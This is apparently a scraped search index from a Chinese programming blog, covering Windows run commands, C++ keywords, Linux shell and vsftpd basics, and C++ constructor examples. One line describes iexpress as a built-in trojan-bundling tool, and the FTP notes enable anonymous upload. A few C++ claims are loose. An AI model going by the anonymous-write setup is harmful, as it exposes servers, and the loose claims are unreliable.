shrpubw--------创建共享文件夹 secpol.msc-----本地安全策略 syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 services.msc—本地服务设置 Sndvol32-------音量控制程序 sfc.exe--------系统文件检查器 sfc /scannow—windows文件保护 tsshutdn-------60秒倒计时关机命令 tsshutdn-------60秒倒计时关机命令 tourstart------xp简介（安装完成后出现的漫游xp程序） taskmgr--------任务管理器 eventvwr-------事件查看器 eudcedit-------造字程序 explorer-------打开资源管理器 packager-------对象包装程序 perfmon.msc----计算机性能监测程序 progman--------程序管理器 regedit.exe----注册表 rsop.msc-------组策略结果集 regedt32-------注册表编辑器 rononce -p ----15秒关机 regsvr32 /u *.dll----停止dll文件运行 regsvr32 /u zipfldr.dll------取消ZIP支持 cmd.exe--------CMD命令提示符 chkdsk.exe-----Chkdsk磁盘检查 certmgr.msc----证书管理实用程序 calc-----------启动计算器 charmap--------启动字符映射表 cliconfg-------SQL SERVER 客户端网络实用程序 Clipbrd--------剪贴板查看器 conf-----------启动netmeeting compmgmt.msc—计算机管理 cleanmgr-------垃圾整理 ciadv.msc------索引服务程序 osk------------打开屏幕键盘 odbcad32-------ODBC数据源管理器 oobe/msoobe /a----检查XP是否激活 lusrmgr.msc----本机用户和组 logoff---------注销命令 iexpress-------木马捆绑工具，系统自带 Nslookup-------IP地址侦测器 fsmgmt.msc-----共享文件夹管理器 utilman--------辅助工具管理器 gpedit.msc-----组策略 explorer-------打开资源管理器","categories":[{"name":"Windows命令","slug":"Windows命令","permalink":"https://xiaowuyoucy.github.io/categories/Windows命令/"}],"tags":[]},{"title":"cpp单词","slug":"bcck01cpp单词","date":"2021-04-28T13:58:43.000Z","updated":"2021-04-28T15:19:07.559Z","comments":true,"path":"2021/04/28/bcck01cpp单词/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/28/bcck01cpp单词/","excerpt":"","text":"day 1 asm auto bool break case catch ​ char class operator const const_cast continue default delete do double dynamic_cast ​ else enum explicit export extern false float for friend ​ goto if inline int long mutable ​ namespace new private protected ​ public register reinterpret_cast return short signed ​ sizeof static static_cast struct switch template this throw ​ true try typedef typeid typename union unsigned using virtual ​ void volatile ​ wchar_t 1. asm asm (指令字符串)：允许在 C++ 程序中嵌入汇编代码。 2. auto auto（自动，automatic）是存储类型标识符，表明变量&quot;自动&quot;具有本地范围，块范围的变量声明（如for循环体内的变量声明）默认为auto存储类型。 3. bool bool（布尔）类型，C++ 中的基本数据结构，其值可选为 true（真）或者 false（假）。C++ 中的 bool 类型可以和 int 混用，具体来说就是 0 代表 false，非 0 代表 true。bool 类型常用于条件判断和函数返回值。 4. break break（中断、跳出），用在switch语句或者循环语句中。程序遇到 break 后，即跳过该程序段，继续后面的语句执行。 5. case 用于 switch 语句中，用于判断不同的条件类型。 6. catch catch 和 try 语句一起用于异常处理。 7. char char（字符，character）类型，C++ 中的基本数据结构，其值一般为 0~255 的 int。这 256 个字符对应着 256 个 ASCII 码。char 类型的数据需要用单引号 ’ 括起来。 8.class class（类）是 C++ 面向对象设计的基础。使用 class 关键字声明一个类。 9. const const（常量的，constant）所修饰的对象或变量不能被改变，修饰函数时，该函数不能改变在该函数外面声明的变量也不能调用任何非const函数。在函数的声明与定义时都要加上const，放在函数参数列表的最后一个括号后。在 C++ 中，用 const 声明一个变量，意味着该变量就是一个带类型的常量，可以代替 #define，且比 #define 多一个类型信息，且它执行内链接，可放在头文件中声明；但在 C 中，其声明则必须放在源文件（即 .C 文件）中，在 C 中 const 声明一个变量，除了不能改变其值外，它仍是一具变量。如: 123const double pi(3.14159);或 const double pi = 3.14159; 10. const_cast用法： 1const_cast&lt;type_id&gt; (expression) 该运算符用来修改类型的 const 或 volatile 属性。除了 const 或 volatile 修饰之外， type_id 和 expression 的类型是一样的。常量指针被转化成非常量指针，并且仍然指向原来的对象；常量引用被转换成非常量引用，并且仍然指向原来的对象；常量对象被转换成非常量对象。 11. continue continue（继续）关键字用于循环结构。它使程序跳过代码段后部的部分，与 break 不同的是，continue 不是进入代码段后的部分执行，而是重新开始新的循环。因而它是&quot;继续循环&quot;之意，不是 break（跳出）。 12. default default（默认、缺省）用于 switch 语句。当 switch 所有的 case 都不满足时，将进入 default 执行。default 只能放在 switch 语句所有的 case 之后，并且是可选的。 13. delete delete（删除）释放程序动态申请的内存空间。delete 后面通常是一个指针或者数组 []，并且只能 delete 通过 new 关键字申请的指针，否则会发生段错误。 14. do do-while是一类循环结构。与while循环不同，do-while循环保证至少要进入循环体一次。 15. double double（双精度）类型，C++ 中的基本数据结构，以双精度形式存储一个浮点数。 16. dynamic_cast dynamic_cast（动态转换），允许在运行时刻进行类型转换，从而使程序能够在一个类层次结构安全地转换类型。dynamic_cast 提供了两种转换方式，把基类指针转换成派生类指针，或者把指向基类的左值转换成派生类的引用。 17. else else 紧跟在 if 后面，用于对 if 不成立的情况的选择。 18. enum enum（枚举）类型，给出一系列固定的值，只能在这里面进行选择一个。 19. explicit explicit（显式的）的作用是&quot;禁止单参数构造函数&quot;被用于自动型别转换，其中比较典型的例子就是容器类型。在这种类型的构造函数中你可以将初始长度作为参数传递给构造函数。 20. export 为了访问其他编译单元（如另一代码文件）中的变量或对象，对普通类型（包括基本数据类、结构和类），可以利用关键字 extern，来使用这些变量或对象时；但是对模板类型，则必须在定义这些模板类对象和模板函数时，使用标准 C++ 新增加的关键字 export（导出）。 21. extern extern（外部的）声明变量或函数为外部链接，即该变量或函数名在其它文件中可见。被其修饰的变量（外部变量）是静态分配空间的，即程序开始时分配，结束时释放。用其声明的变量或函数应该在别的文件或同一文件的其它地方定义（实现）。在文件内声明一个变量或函数默认为可被外部使用。在 C++ 中，还可用来指定使用另一语言进行链接，这时需要与特定的转换符一起使用。目前仅支持 C 转换标记，来支持 C 编译器链接。使用这种情况有两种形式： 123extern &quot;C&quot; 声明语句extern &quot;C&quot; &#123; 声明语句块 &#125; 22. false false（假的），C++ 的基本数据结构 bool 类型的值之一。等同于 int 的 0 值。 23. float float（浮点数），C++ 中的基本数据结构，精度小于 double。 24. for for 是 C++ 中的循环结构之一。 25. friend friend（友元）声明友元关系。友元可以访问与其有 friend 关系的类中的 private/protected 成员，通过友元直接访问类中的 private/protected 成员的主要目的是提高效率。友元包括友元函数和友元类。 26. goto goto（转到），用于无条件跳转到某一标号处开始执行。 27. if if（如果），C++ 中的条件语句之一，可以根据后面的 bool 类型的值选择进入一个分支执行。 28. inline inline（内联）函数的定义将在编译时在调用处展开。inline 函数一般由短小的语句组成，可以提高程序效率。 29. int int（整型，integer），C++ 中的基本数据结构，用于表示整数，精度小于 long。 30. long long（长整型，long integer），C++ 中的基本数据结构，用于表示长整数。 31. mutable mutable（易变的）是 C++ 中一个不常用的关键字。只能用于类的非静态和非常量数据成员。由于一个对象的状态由该对象的非静态数据成员决定，所以随着数据成员的改变，对像的状态也会随之发生变化。如果一个类的成员函数被声明为 const 类型，表示该函数不会改变对象的状态，也就是该函数不会修改类的非静态数据成员。但是有些时候需要在该类函数中对类的数据成员进行赋值，这个时候就需要用到 mutable 关键字。 32. namespace namespace（命名空间）用于在逻辑上组织类，是一种比类大的结构。 33. new new（新建）用于新建一个对象。new 运算符总是返回一个指针。由 new 创建 34. operator operator（操作符）用于操作符重载。这是 C++ 中的一种特殊的函数。 35. private private（私有的），C++ 中的访问控制符。被标明为 private 的字段只能在本类以及友元中访问。 36. protected protected（受保护的），C++ 中的访问控制符。被标明为 protected 的字段只能在本类以及其继承类和友元中访问。 37. public public（公有的），C++ 中的访问控制符。被标明为 public 的字段可以在任何类 38.register register（寄存器）声明的变量称着寄存器变量，在可能的情况下会直接存放在机器的寄存器中；但对 32 位编译器不起作用，当 global optimizations（全局优化）开的时候，它会做出选择是否放在自己的寄存器中；不过其它与 register 关键字有关的其它符号都对32位编译器有效。 39. reinterpret_cast 用法： 1reinpreter_cast&lt;type-id&gt; (expression) type-id 必须是一个指针、引用、算术类型、函数指针或者成员指针。它可以把一个指针转换成一个整数，也可以把一个整数转换成一个指针（先把一个指针转换成一个整数，在把该整数转换成原类型的指针，还可以得到原先的指针值）。 40. return return（返回）用于在函数中返回值。程序在执行到 return 语句后立即返回，return 后面的语句无法执行到。 41. short short（短整型，short integer），C++ 中的基本数据结构，用于表示整数，精度小于 int。 42. signed signed（有符号），表明该类型是有符号数，和 unsigned 相反。数字类型（整型和浮点型）都可以用 signed 修饰。但默认就是 signed，所以一般不会显式使用。 43. sizeof 由于 C++ 每种类型的大小都是由编译器自行决定的，为了增加可移植性，可以用 sizeof 运算符获得该数据类型占用的字节数。 44. static static（静态的）静态变量作用范围在一个文件内，程序开始时分配空间，结束时释放空间，默认初始化为 0，使用时可改变其值。静态变量或静态函数，只有本文件内的代码才可访问它，它的名字（变量名或函数名）在其它文件中不可见。因此也称为&quot;文件作用域&quot;。在 C++ 类的成员变量被声明为 static（称为静态成员变量），意味着它被该类的所有实例所共享，也就是说当某个类的实例修改了该静态成员变量，其修改值为该类的其它所有实例所见；而类的静态成员函数也只能访问静态成员（变量或函数）。类的静态成员变量必须在声明它的文件范围内进行初始化才能使用，private 类型的也不例外。 45. static_cast 用法： 1static_cast &lt; type-id &gt; ( expression ) 该运算符把 expression 转换为 type-id 类型，但没有运行时类型检查来保证转换的安全性。它主要有如下几种用法： ① 用于类层次结构中基类和子类之间指针或引用的转换。进行上行转换（把子类的指针或引用转换成基类表示）是安全的；进行下行转换（把基类指针或引用转换成子类表示）时，由于没有动态类型检查，所以是不安全的。 ② 用于基本数据类型之间的转换，如把 int 转换成 char，把 int 转换成 enum。这种转换的安全性也要开发人员来保证。 ③ 把空指针转换成目标类型的空指针。 ④ 把任何类型的表达式转换成void类? 注意 static_cast 不能转换掉 expression 的 const、volitale、或者 __unaligned 属性。 46. struct struct（结构）类型，类似于 class 关键字，与 C 语言兼容（class 关键字是不与 C 语言兼容的），可以实现面向对象程序设计。 47. switch switch（转换）类似于 if-else-if 语句，是一种多分枝语句。它提供了一种简洁的书写，并且能够生成效率更好的代码。但是，switch 后面的判断只能是int（char也可以，但char本质上也是一种int类型）。switch 语句最后的 default 分支是可选的。 48. template template（模板），C++ 中泛型机制的实现。 49. this this 返回调用者本身的指针。 50. throw throw（抛出）用于实现 C++ 的异常处理机制，可以通过 throw 关键字&quot;抛出&quot;一个异常。 51. true true（真的），C++ 的基本数据结构 bool 类型的值之一。等同于 int 的非 0 值。 52. try try（尝试）用于实现 C++ 的异常处理机制。可以在 try 中调用可能抛出异常的函数，然后在 try 后面的 catch 中捕获并进行处理。 53. typedef typedef（类型定义，type define），其格式为： 1typedef 类型 定义名; 类型说明定义了一个数据类型的新名字而不是定义一种新的数据类型。定义名表示这个类型的新名字。 54. typeid 指出指针或引用指向的对象的实际派生类型。 55. typename typename（类型名字）关键字告诉编译器把一个特殊的名字解释成一个类型。在下列情况下必须对一个 name 使用 typename 关键字： 1． 一个唯一的name（可以作为类型理解），它嵌套在另一个类型中的。 2． 依赖于一个模板参数，就是说：模板参数在某种程度上包含这个name。当模板参数使编译器在指认一个类型时产生了误解。 56. union union（联合），类似于 enum。不同的是 enum 实质上是 int 类型的，而 union 可以用于所有类型，并且其占用空间是随着实际类型大小变化的。 57. unsigned unsigned（无符号），表明该类型是无符号数，和 signed 相反。 58. using 表明使用 namespace。 59. virtual virtual（虚的），C++ 中用来实现多态机制。 60. void void（空的），可以作为函数返回值，表明不返回任何数据；可以作为参数，表明没有参数传入（C++中不是必须的）；可以作为指针使用。 61. volatile volatile（不稳定的）限定一个对象可被外部进程（操作系统、硬件或并发线程等）改变，声明时的语法如下： 1int volatile nVint; 这样的声明是不能达到最高效的，因为它们的值随时会改变，系统在需要时会经常读写这个对象的值。因此常用于像中断处理程序之类的异步进程进行内存单元访问。 62. wchar_t wchar_t 是宽字符类型，每个 wchar_t 类型占 2 个字节，16 位宽。汉字的表示就要用到 wchar_t。","categories":[{"name":"编程词汇","slug":"编程词汇","permalink":"https://xiaowuyoucy.github.io/categories/编程词汇/"}],"tags":[]},{"title":"linux1-3","slug":"002linux1-3","date":"2021-04-28T13:17:57.000Z","updated":"2021-04-28T13:54:38.465Z","comments":true,"path":"2021/04/28/002linux1-3/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/28/002linux1-3/","excerpt":"","text":"快捷键 目录 ls和tree的使用 文件目录和文件的创建 删除目录和文件 文件和目录的拷贝 查看文件内容 mv命令 文件的检索 od 查看二进制文件 软件的安装和卸载 U盘挂载和卸载 ftp服务器配置 vsftpd 终端：(虚拟终端) 所有输入输出设备总称 shell： 命令解析器 bash： bore again shell 命令解析器。 快捷键: 命令和路径补齐: tab 主键盘快捷键: ​ 1).历史命令切换: ​ 历史命令:history ​ 向上遍历: ctrl + p ​ 向下遍历: ctrl + n 2).光标移动: 向左: ctrl + b 向右: ctrl + f 移动到头部: ctrl + a 移动到尾部: ctrl + e 3).删除字符: 删除光标后边的字符: ctrl + d 删除光标前面的字符: ctrl + h 删除光标前面的所有内容: ctrl + u 目录 / 根目录 ls / /bin 常用的命令 cd /bin 进入bin目录 /boot 开机启动项文件 /dev 设备文件 /etc 配置文件 /home 主目录,存放用户 /lib 动态链接库(共享库) /lost-found 存放文件碎片 /media 挂载外设 U盘或光盘等等 /mnt 手动挂载外设到这个目录 /opt 第三方软件 /root 超级用户目录 /sbin 管理员使用的系统管理程序 /usr 用户软件资源目录(用户的软件或文件) /usr/bin 系统用户的应用程序 /usr/sbin 超级用户使用的管理程序和系统守护程序 /usr/src 内核源码默认的放置目录 ctrl + l 清屏,或clear 绝对路径 从/开始 相对路径 ./当前路径 …/上一级路径 cd - 两个相邻目录切换 cd ~ 切换到当前用户目录 cd 切换到用户目录 yxc19981c@yc:~$ yxc19981c 用户名 yc 主机名 ~ 用户目录 $普通用户 超级用户root 切换到超级用户 sudo su 或 su root - rw- r– r– 1 root root 1937 9月 2 2020 ucontext.h 文件类型 所有者 所属组 其他人 硬连接数 文件所有者 文件所属组 文件大小 日期 文件名 文件类型： 文件 “-” 目录 “d” 软连接 “l” --快捷方式 管道 “p” 套接字 “s” 字符设备 “c” 块设备 “b” 未知类型 ls和tree的使用: ls -a 显示所有文件 ls -l 详细显示 ls -al ls -h 人性化显示文件大小 tree 目录 pwd 查看当前位置 文件目录和文件的创建 mkdir 目录名 mkdir dri/dir/dir -p 递归创建目录 mkdir -p dir/dir/dir touch 文件名 touch 文件名1 文件名2 … 文件名n 删除目录和文件 ​ rmdir 空目录名 rm 目录名 -rf (f代表不提示) ​ rm 文件名 -f rm 目录名 -ri (i代表提示) ​ 文件和目录的拷贝 cp 源文件 目标文件名 cp h1 h2 将h1复制一份并命名为h2 如果h2存在将原来内容覆盖 cp 源目录 目的目录 -r 如果目的目录不存在就将源码目拷贝一份并命名为目的目录 如果目的目录存在,就将源目录拷贝一份,复制到目的目录里面 查看文件内容 gedit 文件名 cat 文件名 cat 文件1 文件2 … 文件n 拼接查看文件 cat 文件1 | more more 文件名 回车 一行 空格 一页 只能往后看 q 退出 ctrl + c 退出 less 文件名 回车 一行 空格 一页 可以往前后看 q 退出 ctrl + c 退出 ctrl + p 向前一行 ctrl + n 先后一行 head 文件名 显示文件前十行 head -5 文件名 显示文件前五行 tail 文件名 显示文件后十行 tail -5 文件名 显示文件后五行 mv命令 文件改名 mv 源文件 改名后的文件 移动 ​ mv 文件名 目录名 将文件移动到目录中 文件的检索 grep -r “文件内容” 路径 -r代表递归检索文件 grep -r “printf” / 从根目录开始递归查找文件包含&quot;printf&quot;内容的文件 文件和目录属性命令 wc 获取文本文件的信息 yxsdc19c@yscc:/usr/include$ wc time.h 309 1515 10360 time.h 309代表行数 1515代表单词个数 10360代表字节数 od 查看二进制文件 od -t 文件名 -t 指定数据的显示格式 -tc ASCII字符 -tx 十六进制数 -td 有符号十进制数 -tu 无符号十进制数 -to 八进制数 -tf 浮点数 软件的安装和卸载 在线安装 安装 sudo apt-get install 软件名 卸载 sudo apt-get remove 软件名 更新 sudo apt-get update 更新软件列表 软件列表存放的是软件名字和下载地址 清理所有软件安装包 sudo apt-get clean 实际清理的是: /var/cache/apt/archives目录下的.deb文件 deb包安装 安装 sudo dpkg -i xxx.deb 卸载 sudo dpkg -r xxx 源码安装 1.解压缩源代码包 2.进入到安装目录 3.检测文件是否缺失,创建Makefile,检测编译环境: ./configure 4.编译源码 生成库和可以执行程序:make 5.把库和可执行程序,安装到系统目录下: sudo make install 6.删除和卸载软件:sudo make distclean 7.上述安装步骤并不是绝对的,应该先查看附带的README文件 U盘挂载和卸载 卸载: umount 设备文件名 挂载: mount 设备文件名 挂载路径 将外设挂载到非mnt目录时,会临时覆盖原来内容,卸载之后会恢复 ftp服务器配置 vsftpd 作用:文件上传和下载 ftp服务器配置 配置文件在/etc/vsftpd.conf anonymous_enable=YES 允许匿名用户登录 write_enable=YES 实名登录用户拥有写的权限 local_umask=022 设置本地掩码为022 anon_upload_enable=YES 匿名用户拥有写的权限 anon_mkdir_write_enable=YES 匿名用户可以在ftp服务器上创建目录 重启ftp服务 ​ sudo service vsftpd restart 实名登录ftp ftp ip地址 输入用户 输入密码 退出 bye quit exit 文件上传和下载 上传 在什么目录登录的,文件默认从那里找 put 文件名 下载 get 文件名 不允许操作目录,可以打包处理 匿名登录服务器 用户名 anonymous 不允许匿名用户在任意目录直接切换 只能在一个指定的目录范围内工作 需要在ftp服务器上创建一个匿名用户的目录 --匿名用户的根目录 在配置文件添加 anon_root=/home/yxc19980620c/myFtp/ 匿名登录默认路径是在/srv/ftp 在配置文件/etc/passwd可以查看并修改 ftp:x:123:127:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"深拷贝和浅拷贝","slug":"cpp0023-深拷贝和浅拷贝","date":"2021-04-26T13:22:10.000Z","updated":"2021-04-26T16:12:56.587Z","comments":true,"path":"2021/04/26/cpp0023-深拷贝和浅拷贝/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0023-深拷贝和浅拷贝/","excerpt":"","text":"深拷贝和浅拷贝 字符串如果进行浅拷贝会出现以下问题: 假设有两个char类型指针a,b指向同一个内存空间 当a被释放时,b还未修改,再次使用b时就会出现段错误(Linux)或内存中断(windows) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include&lt;iostream&gt;using namespace std;class Teacher &#123;public: Teacher() &#123; m_id = 0; m_name = NULL; &#125; //有参构造函数,开辟一个空间给m_name Teacher(int id,const char * name) &#123; int len = strlen(name); m_name = (char *)malloc(len + 1); strcpy(m_name, name); m_id = id; &#125; //拷贝构造函数,开辟一个空间 Teacher(const Teacher &amp; another) &#123; cout &lt;&lt; \"Teacher(const Teacher &amp; another)..\" &lt;&lt; endl; int len = strlen(another.m_name); this-&gt;m_name = (char *)malloc(len + 1); strcpy(this-&gt;m_name, another.m_name); this-&gt;m_id = another.m_id; &#125; //打印id 和name和name的地址 void print() &#123; cout &lt;&lt; m_id &lt;&lt; endl; cout &lt;&lt; m_name &lt;&lt; endl; cout &lt;&lt; (int *)m_name &lt;&lt; endl; cout &lt;&lt; \"================================================\" &lt;&lt; endl; &#125; //释放从堆区开辟的内存 ~Teacher() &#123; if (m_name != NULL) &#123; cout &lt;&lt; m_name &lt;&lt; \" \"; free(m_name); m_name = NULL; cout &lt;&lt; \"free\" &lt;&lt; endl; cout &lt;&lt; \"================================================\" &lt;&lt;endl; &#125; &#125;private: int m_id; char * m_name;&#125;;void test1()&#123; Teacher tc1(123, \"xiaoh\"); Teacher tc2(tc1); tc1.print(); tc2.print();&#125;int main(int argc, char* argv[])&#123; test1(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类中默认函数的隐藏条件","slug":"cpp0022-类中默认函数的隐藏条件","date":"2021-04-26T13:22:10.000Z","updated":"2021-04-26T13:27:28.461Z","comments":true,"path":"2021/04/26/cpp0022-类中默认函数的隐藏条件/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0022-类中默认函数的隐藏条件/","excerpt":"","text":"类中默认函数的隐藏条件 编译器不提供默认无参构造函数的条件: 1.显示的提供一个有参或无参构造函数 2.显示的提供一个拷贝构造函数 编译器不提供默认拷贝构造函数的条件 1.显示的提供一个拷贝构造函数 编译器不提供析构函数的条件 1.显示的提供了一个析构函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class B&#123;public: /* 默认提供的函数 B() &#123; //默认的无惨构造函数 &#125; B(const B&amp; b) &#123; m_b = b.m_b; //默认的拷贝构造函数 p = b.p; &#125; ~B() &#123; //默认的析构函数 &#125; */ //如果显示的写了一个普通构造函数， 会隐藏默认的无惨构造函数 //如果显示的写了一个拷贝构造函数 ，会隐藏默认的无参构造函数和默认的拷贝构造函数 //如果显示的写了一个析构函数， 会隐藏默认的析构函数 B(const B&amp; b) &#123; &#125;private: int m_b; char *p;&#125;;class A&#123;public: /* 默认的构造函数 如果普通构造函数，提供了一个显示的构造， 那么这个无参的默认构造就会被隐藏。 不会把拷贝构造函数隐藏掉 A() &#123; &#125; */ A(int a) &#123; m_a = a; &#125; /* 默认的拷贝构造函数 A(const A &amp; a) &#123; m_a = a; &#125; */ //显示的提供一个拷贝构造的函数的时候，默认的拷贝构造函数就会被隐藏 A(const A &amp;a) &#123; cout &lt;&lt; \"显示提供的拷贝构造函数\" &lt;&lt; endl; m_a = a.m_a; &#125; /* 默认的析构函数 ~A() &#123; &#125; */ //只有提供一个显示的析构函数，才会将默认的析构覆盖点 ~A() &#123; cout &lt;&lt; \"A的析构函数 调用 \" &lt;&lt; endl; &#125;private: int m_a;&#125;;int main(void)&#123; A aObj(10); //当你不提供任何构造函数的时候， 系统会有一个默认的构造函数 A aObj2 = aObj; //调用了aObj2的拷贝构造函数 //A aObj2(aObj); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"拷贝构造函数","slug":"cpp0021-拷贝构造函数","date":"2021-04-26T12:41:44.000Z","updated":"2021-04-26T13:06:54.805Z","comments":true,"path":"2021/04/26/cpp0021-拷贝构造函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0021-拷贝构造函数/","excerpt":"","text":"拷贝构造函数 编译器会默认提供一个浅拷贝的构造函数 一旦手动提供了一个拷贝构造函数,编译器将不再提供默认的拷贝构造函数 1234567class 类名&#123; 类名(const 类名 &amp; another) &#123; 拷⻉贝构造体 &#125;&#125; 1234567class A&#123; A(const A &amp; another) &#123; &#125;&#125; test.h 12345678910111213141516171819#pragma onceclass test&#123;public: test(); test(int a,int b); test(int a); //拷贝构造函数 test(const test &amp; another); //赋值操作符函数 void operator=(const test &amp; another); ~test(); void print();private: int mA; int mB;&#125;; test.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include \"test.h\"#include&lt;iostream&gt;using namespace std;test::test()&#123; mA = 0; mB = 0;&#125;test::test(int a, int b)&#123; mA = a; mB = b;&#125;test::test(int a)&#123; mA = a; mB = 0;&#125;test::test(const test &amp; another)&#123; mA = another.mA; mB = another.mB; cout &lt;&lt; \"我是拷贝构造函数\" &lt;&lt; endl;&#125;void test::operator=(const test &amp; another)&#123; mA = another.mA; mB = another.mB; cout &lt;&lt; \"我是赋值操作符函数\" &lt;&lt; endl;&#125;test::~test()&#123; cout &lt;&lt; \"~test\" &lt;&lt; endl;&#125;void test::print()&#123; cout &lt;&lt; mA &lt;&lt; endl; cout &lt;&lt; mB &lt;&lt; endl; &#125; main.cpp 12345678910111213#include&lt;iostream&gt;#include\"test.h\"using namespace std;int main(int argc, char* argv[])&#123; test t1(100, 200); test t2(111); test t3(t2);//调用拷贝构造函数 test t4 = t3;//这里调用的是拷贝构造函数,因为是初始化 t4 = t2; //这里是调用赋值操作符函数,因为不是初始化 return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"默认的无参构造和析构函数","slug":"cpp0020-默认的无参构造和析构函数","date":"2021-04-26T12:32:36.000Z","updated":"2021-04-26T12:37:41.411Z","comments":true,"path":"2021/04/26/cpp0020-默认的无参构造和析构函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0020-默认的无参构造和析构函数/","excerpt":"","text":"默认的无参构造和析构函数 不写构造函数时,编译器会默认提供一个无参构造函数 如果显示的提供了一个构造函数,编译器将不再提供无参构造函数 如果显示提供了一个析构函数,编译器将不再提供构造函数 如果手动添加了一个有参构造函数,就需要根据情况添加一个无参构造函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Test&#123;public: //默认构造函数。 就是一个无参数的构造函数， //如果不显示提供构造函数，系统就是调用默认的构造函数 /* Test() &#123;&#125; 默认的构造函数，已经手动提供，默认就被隐藏 */ //如果我们提供了一个显示的构造函数，那么默认的构造函数就被隐藏掉了。 //构造函数一旦手动提供， 默认将不复存在。 Test(int x, int y) &#123; m_x = x; m_y = y; cout &lt;&lt; \"调用了有参数的构造函数\" &lt;&lt; endl; &#125; //无参数的构造函数 Test()&#123; m_x = 0; m_y = 0; cout &lt;&lt; \"调用了无参数的构造函数\" &lt;&lt; endl; &#125; //拷贝构造函数 ，想通过另一个Test对象 another 将本对象进行拷贝 Test(const Test &amp; another) &#123; m_x = another.m_x; m_y = another.m_y; cout &lt;&lt; \"调用了拷贝构造函数\" &lt;&lt; endl; &#125; //等号操作符 void operator = (const Test &amp;t) &#123; m_x = t.m_x; m_y = t.m_y; &#125; void printT() &#123; cout &lt;&lt; \"x : \" &lt;&lt; m_x &lt;&lt; \", y : \" &lt;&lt; m_y &lt;&lt; endl; &#125; //提供一个析构函数 ~Test() &#123; cout &lt;&lt; \"~Test（）析构函数被执行了\" &lt;&lt; endl; cout &lt;&lt; \"(\" &lt;&lt; m_x &lt;&lt; \", \" &lt;&lt; m_y &lt;&lt; \")\" &lt;&lt; \"被析构了\" &lt;&lt; endl; &#125; private: int m_x; int m_y;&#125;;int main(void)&#123; Test t1; //调用无参的构造函数 Test t2(10, 20); //Test t3(10, 20, 30); t2.printT(); Test t3(t2); //调用t3的拷贝构造函数 //调用拷贝构造函数的方式 t3.printT(); //Test t4 = t2; // 依然是调用t4的拷贝构造函数， Test t4(100, 200); //调用t4 的两个参数的构造函数 Test t5; //先调用无惨构造。 t5 = t2; //不会调用拷贝构造函数 //调用=号重载操作符 赋值操作符 //析构函数的调用顺序， 跟对象的构造顺序相反， 谁先构造，谁最后一个被析构。 return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"构造和析构","slug":"cpp0019-构造和析构","date":"2021-04-26T12:09:33.000Z","updated":"2021-04-26T12:26:06.742Z","comments":true,"path":"2021/04/26/cpp0019-构造和析构/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0019-构造和析构/","excerpt":"","text":"构造和析构 构造函数 定义 C++中的类可以定义与类名相同的特殊成员函数，这种与类名相同的成员函数叫做构造函数. 1234567class 类名&#123; 类名(形式参数) &#123; 构造体 &#125;&#125; 123456class A&#123; A(形参) &#123; &#125;&#125; 调用 自动调用：一般情况下C++编译器会自动调用构造函数. 手动调用：在一些情况下则需要手工调用构造函数. 规则: 1 在对象创建时自动调用,完成初始化相关工作。 2 无返回值,与类名同,默认无参,可以重载,可默认参数。 3 一经实现,默认不复存在。 析构函数 定义 C++中的类可以定义一个特殊的成员函数清理对象，这个特殊的成员函数叫做析构函数. 1234567891011121314151617class 类名&#123; ~类名() &#123; 析构体 &#125;&#125;//--------------------------------------------class A&#123; ~A() &#123; &#125;&#125; 规则: 1 对象销毁时,自动调用。完成销毁的善后工作。 2 无返值 ,与类名同。无参。不可以重载与默认参数 析构函数的作用,并不是删除对象,而在对象销毁前完成的一些清理工作。 test.h 12345678910111213#pragma onceclass test&#123;public: test(); test(int a,int b); test(int a); ~test(); void print();private: int mA; int mB;&#125;; test.cpp 12345678910111213141516171819202122232425262728293031323334#include \"test.h\"#include&lt;iostream&gt;using namespace std;test::test()&#123; mA = 0; mB = 0;&#125;test::test(int a, int b)&#123; mA = a; mB = b;&#125;test::test(int a)&#123; mA = a; mB = 0;&#125;test::~test()&#123; cout &lt;&lt; \"~test\" &lt;&lt; endl;&#125;void test::print()&#123; cout &lt;&lt; mA &lt;&lt; endl; cout &lt;&lt; mB &lt;&lt; endl; &#125; main.cpp 12345678910111213#include&lt;iostream&gt;#include\"test.h\"using namespace std;int main(int argc, char* argv[])&#123; test t1(100, 200); test t2(111); t1.print(); t2.print(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类分成多文件","slug":"cpp0018-类分成多文件","date":"2021-04-26T10:10:39.000Z","updated":"2021-04-26T10:32:21.713Z","comments":true,"path":"2021/04/26/cpp0018-类分成多文件/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0018-类分成多文件/","excerpt":"","text":"类分成多文件 circle.h 12345678910111213141516171819#pragma onceclass Circle&#123;public: void setR(double r); double getR(); double getArea(); double getGirth();private: double m_R; double m_area; double m_girth;&#125;; circle.cpp 在类的外部创建类方法需要使用作用域名; 函数类型 类名::类方法(函数形参) 12345678910111213141516171819202122#include \"Circle.h\"double 